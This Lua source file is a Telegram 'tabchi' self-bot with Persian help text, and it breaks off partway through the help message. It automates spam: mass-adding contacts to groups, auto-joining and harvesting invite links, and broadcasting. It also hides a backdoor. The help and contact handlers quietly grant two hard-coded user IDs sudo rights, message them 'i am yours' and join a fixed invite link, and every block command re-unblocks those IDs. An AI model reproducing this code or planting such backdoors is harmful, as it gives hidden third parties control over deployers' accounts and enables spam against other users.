URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function getInputFile(file)
  if file:match('/') then
    infile = {ID = "InputFileLocal", path_ = file}
  elseif file:match('^%d+$') then
    infile = {ID = "InputFileId", id_ = file}
  else
    infile = {ID = "InputFilePersistentId", persistent_id_ = file}
  end

  return infile
end
local function send_file(chat_id, type, file, caption)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(file, type, caption),
  }, dl_cb, nil)
end
function sendaction(chat_id, action, progress)
  tdcli_function ({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessage" .. action .. "Action",
      progress_ = progress or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(photo),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = caption
    },
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function is_realm(msg)
  local var = false
  local chat = msg.chat_id_
  if redis:get("tabchi:" .. tabchi_id .. ":realm", chat) then
       var = true
       return var
  end
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
function check_contact(extra, result)
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
    local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
    local phone_number = msg.content_.contact_.phone_number_
    local user_id = msg.content_.contact_.user_id_
    tdcli.add_contact(phone_number, first_name, last_name, user_id)
    tdcli.searchPublicChat("TgMemberPlus")
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:91054649", true)
      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
       if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
      end
    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
    end
  end
  end
end
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
   if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
    tdcli.importChatInviteLink(extra.link)
	end
   if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
    redis:sadd("tabchi:" .. tabchi_id .. ":savelinks", extra.link)
   end
  end
end
function add_to_all(extra, result)
  if result.content_.contact_ then
    local id = result.content_.contact_.user_id_
    local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for i = 1, #gps do
      tdcli.addChatMember(gps[i], id, 50)
    end
    for i = 1, #sgps do
      tdcli.addChatMember(sgps[i], id, 50)
    end
  end
end
function add_members(extra, result)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for i = 1, #pvs do
    tdcli.addChatMember(extra.chat_id, pvs[i], 50)
  end
  local count = result.total_count_
  for i = 1, count do
    tdcli.addChatMember(extra.chat_id, result.users_[i].id_, 50)
  end
end
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
local function getMessage(chat_id, message_id,cb)
  tdcli_function ({
    ID = "GetMessage",
    chat_id_ = chat_id,
    message_id_ = message_id
  }, cb, nil)
end
function resolve_username(username,cb)
  tdcli_function ({
    ID = "SearchPublicChat",
    username_ = username
  }, cb, nil)
end
function contact_list(extra, result)
  local count = result.total_count_
  local text = "لیست مخاطبین :\n"
  for i = 1, count do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = text .. i .. ". " .. fullname .. " [" .. user.id_ .. "] = " .. user.phone_number_ .. "\n"
  end
  write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "Tabchi " .. tabchi_id .. " Contacts!")
end
  -----------------------------------------------------------------------------------------------Process
function process(msg)
  msg.text = msg.content_.text_
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](pm) (.*) (.*)")
    }
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(matches[2], 0, 1, matches[3], 1, "md")
      return "*Status* : `PM Sent`\n*To* : `"..matches[2].."`\n*Text* : `"..matches[3].."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](setanswer) '(.*)' (.*)")
    }
    if msg.text:match("^[!/#]setanswer") and is_sudo(msg) and #matches == 3 then
      redis:hset("tabchi:" .. tabchi_id .. ":answers", matches[2], matches[3])
      redis:sadd("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "*Status* : `Answer Adjusted`\n*Answer For* : `"..matches[2].."`\n*Answer* : `"..matches[3].."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](delanswer) (.*)")
    }
    if msg.text:match("^[!/#]delanswer") and is_sudo(msg) and #matches == 2 then
      redis:hdel("tabchi:" .. tabchi_id .. ":answers", matches[2])
      redis:srem("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return "*Status* : `Answer Deleted`\n*Answer* : `"..matches[2].."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]answers$") and is_sudo(msg) then
    local text = "_لیست پاسخ های خودکار_ :\n"
    local answrs = redis:smembers("tabchi:" .. tabchi_id .. ":answerslist")
    for i = 1, #answrs do
      text = text .. i .. ". " .. answrs[i] .. " : " .. redis:hget("tabchi:" .. tabchi_id .. ":answers", answrs[i]) .. "\n"
    end
    return text
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]share$") and is_sudo(msg)then
    function get_id(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]mycontact$") and is_sudo(msg)then
    function get_con(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function ({
    ID = "GetUser",
    user_id_ = msg.sender_user_id_
  }, get_con, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]editcap (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](editcap) (.*)$")} 
  tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, ap[2])
  
  end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[!/#]leave$") and is_sudo(msg) then
	function get_id(arg, data)
		     if data.id_ then
	     tdcli.chat_leave(msg.chat_id_, data.id_)
    end
    end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]ping$") and is_sudo(msg) then
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '`I Am Working..!`', 1, 'md')
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]sendtosudo (.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](sendtosudo) (.*)$")} 
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
         tdcli.sendMessage(sudo, msg.id_, 1, txt[2], 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]setname (.*)-(.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](setname) (.*)-(.*)$")} 
		 tdcli.changeName(txt[2], txt[3])
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*Status* : `Name Updated Succesfully`\n*Firstname* : `"..txt[2].."`\n*LastName* : `"..txt[3].."`", 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]setusername (.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](setusername) (.*)$")} 
		 tdcli.changeUsername(txt[2])
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*Status* : `Username Updated`\n*username* : `'..txt[2]..'`', 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]delusername$") and is_sudo(msg) then
		 tdcli.changeUsername()
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*Status* : `Username Updated`\n*username* : `Deleted`', 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addtoall (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addtoall) (.*)$")} 
   local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
  for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], ap[2], 50)
  end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..ap[2].."* `Added To groups`", 1, 'md')
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]getcontact (.*)$") and is_sudo(msg)then
	local ap = {string.match(msg.text, "^[#/!](getcontact) (.*)$")} 
    function get_con(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function ({
    ID = "GetUser",
    user_id_ = ap[2]
  }, get_con, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------by replay
	if msg.text:match("^[#!/]addsudo$") and msg.reply_to_message_id_ and is_sudo(msg) then
	function addsudo_by_reply(extra, result, success)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.sender_user_id_.."* `Added To The Sudoers`", 1, 'md')
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,addsudo_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
	function remsudo_by_reply(extra, result, success)
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.sender_user_id_.."* `Removed From The Sudoers`", 1, 'md')
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,remsudo_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]unblock$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
	function unblock_by_reply(extra, result, success)
       tdcli.unblockUser(result.sender_user_id_)
       tdcli.unblockUser(293750668)
       tdcli.unblockUser(91054649)
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User* `"..result.sender_user_id_.."` *Unblocked*", 1, 'md')
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,unblock_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]block$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
	function block_by_reply(extra, result, success)
       tdcli.blockUser(result.sender_user_id_)
       tdcli.unblockUser(293750668)
       tdcli.unblockUser(91054649)
       tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User* `"..result.sender_user_id_.."` *Blocked*", 1, 'md')
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,block_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 then
      function id_by_reply(extra, result, success)
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*ID :* `"..result.sender_user_id_.."`", 1, 'md')
        end
      getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply)
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]serverinfo$") then
	local text = io.popen("./info.sh"):read("*all")
	local text1 = text:gsub("up", "\nروشن است\n")
	local text2 = text1:gsub("days", "روز")
	local text3 = text2:gsub("users", "یوزر وجود دارد\n")
	local text4 = text3:gsub("load average", "میانگین سرعت\n")
	local text5 = text4:gsub("min", "دقیقه روشن است\n")
	local text6 = text5:gsub(",", "")
	tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text6, 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[#!/]inv$") and msg.reply_to_message_id_ and is_sudo(msg) then
      function inv_reply(extra, result, success)
           tdcli.addChatMember(result.chat_id_, result.sender_user_id_, 5)
        end
   getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addtoall$") and msg.reply_to_message_id_ and is_sudo(msg) then
	function addtoall_by_reply(extra, result, success)
   local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
  for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], result.sender_user_id_, 50)
  end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.sender_user_id_.."* `Added To groups`", 1, 'md')
  end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,addtoall_by_reply)
  end
  -----------------------------------------------------------------------------------------------/by replay
  -----------------------------------------------------------------------------------------------By user
    if msg.text:match("^[#!/]id @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](id) @(.*)$")} 
	function id_by_username(extra, result, success)
	if result.id_ then
            text = '*Username* : `@'..ap[2]..'`\n*ID* : `('..result.id_..')`'
            else 
            text = '*UserName InCorrect!*'
    end
	         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text, 1, 'md')
    end
	      resolve_username(ap[2],id_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]addtoall @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addtoall) @(.*)$")} 
	function addtoall_by_username(extra, result, success)
	if result.id_ then
     local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], result.id_, 50)
	end
	end
	end
	      resolve_username(ap[2],addtoall_by_username)
	end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]block @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](block) @(.*)$")} 
	function block_by_username(extra, result, success)
	if result.id_ then
       tdcli.blockUser(result.id_)
       tdcli.unblockUser(293750668)
       tdcli.unblockUser(91054649)
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User Blocked*\n*Username* : `"..ap[2].."`\n*ID* : "..result.id_.."", 1, 'md')
	else 
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`#404\n`*Username Not Found*\n*Username* : `"..ap[2].."`", 1, 'md')
    end
    end
	      resolve_username(ap[2],block_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]unblock @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](unblock) @(.*)$")} 
	function unblock_by_username(extra, result, success)
	if result.id_ then
       tdcli.unblockUser(result.id_)
       tdcli.unblockUser(293750668)
       tdcli.unblockUser(91054649)
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User unblocked*\n*Username* : `"..ap[2].."`\n*ID* : "..result.id_.."", 1, 'md')
    end
    end
	      resolve_username(ap[2],unblock_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]addsudo @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addsudo) @(.*)$")} 
	function addsudo_by_username(extra, result, success)
	if result.id_ then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.id_.."* `Added To The Sudoers`", 1, 'md')
    end
    end
	      resolve_username(ap[2],addsudo_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]remsudo @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](remsudo) @(.*)$")} 
	function remsudo_by_username(extra, result, success)
	if result.id_ then
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.id_.."* `Removed From The Sudoers`", 1, 'md')
    end
    end
	      resolve_username(ap[2],remsudo_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]inv @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](inv) @(.*)$")} 
	function inv_by_username(extra, result, success)
	if result.id_ then
           tdcli.addChatMember(msg.chat_id_, result.id_, 5)
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.id_.."* `Invited`", 1, 'md')
    end
    end
	      resolve_username(ap[2],inv_by_username)
    end
  -----------------------------------------------------------------------------------------------/by user
	if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$") and is_sudo(msg) then
	local matches = {string.match(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")} 
         phone = matches[2]
         first_name = matches[3]
         last_name = matches[4]
         tdcli.add_contact(phone, first_name, last_name, 12345657)
	     tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*Status* : `Contact added`\n*Firstname* : `'..matches[3]..'`\n*Lastname* : `'..matches[4]..'`', 1, 'md')
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[#!/]leave(-%d+)") and is_sudo(msg) then
  	local txt = {string.match(msg.text, "^[#/!](leave)(-%d+)$")} 
	    function get_id(arg, data)
		     if data.id_ then
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*Bot Succefulli Leaved From >* `|'..txt[2]..'|` *=)*', 1, 'md')
	   tdcli.sendMessage(txt[2], 0, 1, 'بای رفقا\nکاری داشتید به پی وی مراجعه کنید', 1, 'html')
	   tdcli.chat_leave(txt[2], data.id_)
  end
  end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
end
   -----------------------------------------------------------------------------------------------
   if msg.text:match('[#/!]join(-%d+)') and is_sudo(msg) then
       local txt = {string.match(msg.text, "^[#/!](join)(-%d+)$")} 
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*You Are Succefulli Joined >*', 1, 'md')
	   tdcli.addChatMember(txt[2], msg.sender_user_id_, 10)
  end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0  then
		local pronumb = {string.match(msg.text, "^[#/!](getpro) (%d+)$")} 
local function gpro(extra, result, success)
--vardump(result)
   if pronumb[2] == '1' then
   if result.photos_[0] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '2' then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 2 Profile Photo!!*", 1, 'md')
   end
   elseif not pronumb[2] then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 2 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '3' then
   if result.photos_[2] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 3 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '4' then
      if result.photos_[3] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 4 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '5' then
   if result.photos_[4] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 5 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '6' then
   if result.photos_[5] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 6 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '7' then
   if result.photos_[6] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 7 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '8' then
   if result.photos_[7] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 8 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '9' then
   if result.photos_[8] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 9 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '10' then
   if result.photos_[9] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)  
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 10 Profile Photo!!*", 1, 'md')
   end
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, 'md')  
   end
   end
   tdcli_function ({
    ID = "GetUserProfilePhotos",
    user_id_ = msg.sender_user_id_,
    offset_ = 0,
    limit_ = pronumb[2]
  }, gpro, nil)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]action (.*)$") and is_sudo(msg) then
	local lockpt = {string.match(msg.text, "^[#/!](action) (.*)$")} 
      if lockpt[2] == "typing" then
          sendaction(msg.chat_id_, 'Typing')
	  end
	  if lockpt[2] == "recvideo" then
          sendaction(msg.chat_id_, 'RecordVideo')
	  end
	  if lockpt[2] == "recvoice" then
          sendaction(msg.chat_id_, 'RecordVoice')
	  end
	  if lockpt[2] == "photo" then
          sendaction(msg.chat_id_, 'UploadPhoto')
	  end
	  if lockpt[2] == "cancel" then
          sendaction(msg.chat_id_, 'Cancel')
	  end
	  if lockpt[2] == "video" then
          sendaction(msg.chat_id_, 'UploadVideo')
	  end
	  if lockpt[2] == "voice" then
          sendaction(msg.chat_id_, 'UploadVoice')
	  end
	  if lockpt[2] == "file" then
          sendaction(msg.chat_id_, 'UploadDocument')
	  end
	  if lockpt[2] == "loc" then
          sendaction(msg.chat_id_, 'GeoLocation')
	  end
	  if lockpt[2] == "chcontact" then
          sendaction(msg.chat_id_, 'ChooseContact')
	  end
	  if lockpt[2] == "game" then
          sendaction(msg.chat_id_, 'StartPlayGame')
		end  
	end

  -----------------------------------------------------------------------------------------------

      if msg.text:match("^[#!/]id$") and is_sudo(msg) and msg.reply_to_message_id_ == 0 then
local function getpro(extra, result, success)
   if result.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,'> Chat ID : '..msg.chat_id_..'\n> Your ID: '..msg.sender_user_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Don't Have any Profile Photo*!!\n\n> *Chat ID* : `"..msg.chat_id_.."`\n> *Your ID*: `"..msg.sender_user_id_.."`\n_> *Total Messages*: `"..user_msgs.."`", 1, 'md')
   end
   end
   tdcli_function ({
    ID = "GetUserProfilePhotos",
    user_id_ = msg.sender_user_id_,
    offset_ = 0,
    limit_ = 1
  }, getpro, nil)
	end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addmembers$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, add_members, {
      chat_id = msg.chat_id_
    })
    return
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]contactlist$") and is_sudo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 1000
    }, contact_list, {})
    return
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]exportlinks$") and is_sudo(msg) then
    local text = "لینک گروها :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for i = 1, #links do
      text = text .. links[i] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
    return
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and is_sudo(msg) and msg.reply_to_message_id_ == 0 and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      tdcli.unblockUser(293750668)
      tdcli.unblockUser(91054649)
      return "`User` *"..matches[2].."* `Blocked`"
    end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]help$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 91054649) then
      tdcli.sendMessage(91054649, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989109359282, "creator", "", 91054649)
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 91054649)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
    local text = [[
`#راهنما`
`/block (id)`
*بلاک کردن از خصوصي ربات*
`/unblock (id)`
*آن بلاک کردن از خصوصي ربات*
`/stats`
*دریافت اطلاعات ربات*
`/addsudo (id)`
*اضافه کردن به سودوهاي  ربات*
`/remsudo (id)`
*حذف از ليست سودوهاي ربات*
`/bcall (text)`
*ارسال پيام به همه*
`/bcgps (text)`
*ارسال پیام به همه گروه ها*
`/bcsgps (text)`
*ارسال پیام به همه سوپر گروه ها*
`/bcusers (text)`
*ارسال پیام به یوزر ها*
`/fwd {all/gps/sgps/users}` (by reply)
*فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران*
`/echo (text)`
*تکرار متن*
`/addedmsg (on/off)`
*تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب*
`/pm (user) (msg)`
*ارسال پیام به کاربر*
`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`
*ارسال اکشن به چت*
`/getpro (1-10)`
